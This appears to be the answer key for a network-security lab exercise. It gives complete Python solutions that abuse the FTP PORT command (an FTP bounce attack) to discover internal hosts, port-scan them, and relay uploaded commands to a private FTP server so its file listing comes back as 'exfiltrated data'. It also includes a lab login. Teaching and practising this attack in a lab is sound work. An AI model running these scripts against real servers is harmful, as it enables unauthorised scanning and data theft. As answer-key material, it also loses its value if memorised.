.. _ref_answers:

============================================================
Answers
============================================================

------------------------------------------------------------
Exercise 1
------------------------------------------------------------

These answers are largely down to your exact network setup.

------------------------------------------------------------
Exercise 2
------------------------------------------------------------

************************************************************
Task 2: Discover hosts on the internal network
************************************************************

::

    import sys, os
    from cp_ftp import FTP

    # List of discovered host IP addresses.
    hosts = []

    for last_octet in range(101, 132):
      # Make a new FTP connection each time for simplicity.
      ftp = FTP("192.168.56.101", debug=False)
      ftp.send_login_commands("student", "golyeeHug6")

      host = "192.168.56.%d" % last_octet
      target_address = (host, 22)

      ################################################################################
      # STUDENT TODO 1: Send a PORT command for target_address. Then send data to it.
      # Hint: the provided examples/remote_port.py will be useful.
      # Important: if a port is open then run:
      #   hosts_ports[host].append(port)
      ################################################################################

      # Send a PORT command pointing to port 22 on this target.
      ftp.send_port_command(target_address)
      # If the PORT command was somehow invalid, skip this target.
      response = ftp.recv_response()
      if response.code != 200:
        print(response)
        continue

      # Try sending file LIST output to target on port 22.
      ftp.send_command("LIST")
      response = ftp.recv_response()
      print(target_address, response)

      # Success is indicated by this response:
      #   150 Opening ASCII mode data connection for file list
      if response.code == 150:
        hosts.append(target_address)

      ftp.close()

    print(hosts)

************************************************************
Task 3: Port scan discovered hosts
************************************************************

::

    import sys, os
    from cp_ftp import FTP

    # List of discovered host IP addresses.
    hosts = ["192.168.56.102", "192.168.56.103"]
    hosts_ports = {}

    for host in hosts:
      hosts_ports[host] = []

      for port in range(1, 1024):
        # Make a new FTP connection each time for simplicity.
        ftp = FTP("192.168.56.101", debug=False)
        ftp.send_login_commands("student", "golyeeHug6")

        target_address = (host, port)

        ################################################################################
        # STUDENT TODO 1: Send a PORT command for target_address. Then send data to it.
        # Hint: the provided examples/remote_port.py will be useful.
        # Important: if a port is open then run:
        #   hosts_ports[host].append(port)
        ################################################################################

        # Send a PORT command pointing to target port on target host.
        ftp.send_port_command(target_address)
        # If the PORT command was somehow invalid, skip this host.
        response = ftp.recv_response()
        if response.code != 200:
          print(response)
          continue

        # Try sending file LIST output to target on chosen port.
        ftp.send_command("LIST")
        response = ftp.recv_response()
        print(target_address, response)

        # Success is indicated by this response:
        #   150 Opening ASCII mode data connection for file list
        if response.code == 150:
          hosts_ports[host].append(port)

        ftp.close()

    for host in hosts:
      print("%s has ports %s open." % (host, ", ".join(map(str, hosts_ports[host]))))

************************************************************
Extension Task: Exfiltrate data from a private FTP server
************************************************************

::

    import sys, os
    from cp_ftp import FTP

    ftp = FTP("192.168.56.101", debug=True)
    ftp.send_login_commands("student", "golyeeHug6")

    ################################################################################
    # Build a script to get a LIST of files on the private server.
    ################################################################################

    # 1. Commands to log in.
    login_commands = ftp.get_login_commands("student", "golyeeHug6")

    # 2. A PORT command for how to get data back to this script from the private server.
    exfiltration_data_address = ftp.new_data_address()
    port_command = ftp.get_port_command(exfiltration_data_address)

    # 3. Build up the list of commands.
    exploit_commands = []
    exploit_commands.append(login_commands)
    exploit_commands.append(port_command)
    exploit_commands.append("LIST")
    exploit_commands.append("QUIT")

    # 4. Put the commands together. Pad with 1M nullbytes to ensure socket stays open long enough.
    exploit_file = "exploit.txt"
    file_contents = "\r\n".join(exploit_commands) + "\0" * 1000000

    ################################################################################
    # STUDENT TODO 1: Upload the script to the server.
    # Hint: the provided examples/stor.py will be useful.
    ################################################################################

    # 1. Set the PORT to send data upon.
    data_address = ftp.new_data_address()
    ftp.send_port_command(data_address)
    response = ftp.recv_response()
    if response.code != 200:
      print(response)
      sys.exit(1)

    # 2. Command to upload the exploit commands to a file.
    ftp.send_command("STOR %s" % exploit_file)
    response = ftp.recv_response()
    if response.code != 150:
      print(response)
      sys.exit(1)

    # 3. Send the exploit commands along the data connection.
    ftp.send_data(file_contents)
    response = ftp.recv_response()
    if response.code != 226:
      print(response)
      sys.exit(1)

    ################################################################################
    # STUDENT TODO 2: Have the server send the script to the private server.
    # Hint: the provided examples/remote_port.py will be useful.
    # Hint: unlike in that example, we *are* recieving data inbetween the two data
    #       transfer status responses.
    # Hint: you need to get data from the same port as exfiltration_data_address.
    #       ftp.new_data_address(port=exfiltration_data_address[1])
    #       print("EXFILTRATED DATA: %s" % ftp.recv_data())
    ################################################################################

    # 1. Tell server it can open Data Connection to private server's FTP Command port.
    target_address = ("192.168.56.103", 21)
    ftp.send_port_command(target_address)
    response = ftp.recv_response()
    if response.code != 200:
      print(response)
      sys.exit(1)

    # 2. Tell server to open data and connection and send exploit commands to private server.
    ftp.send_command("RETR %s" % exploit_file)
    response = ftp.recv_response()
    if response.code != 150:
      print(response)
      sys.exit(1)

    # 3. Rebind to the exfilitration port chosen earlier and read LIST of private files from it.
    ftp.new_data_address(port=exfiltration_data_address[1])
    print("********* [EXFILTRATED DATA BEGINS] *********")
    ftp.recv_data()
    print("********* [EXFILTRATED DATA ENDS] *********")

    # 4. Final success/failure mode for sending exploit commands to private server.
    response = ftp.recv_response()
    if response.code != 226:
      print(response)
      sys.exit(1)

    ftp.close()
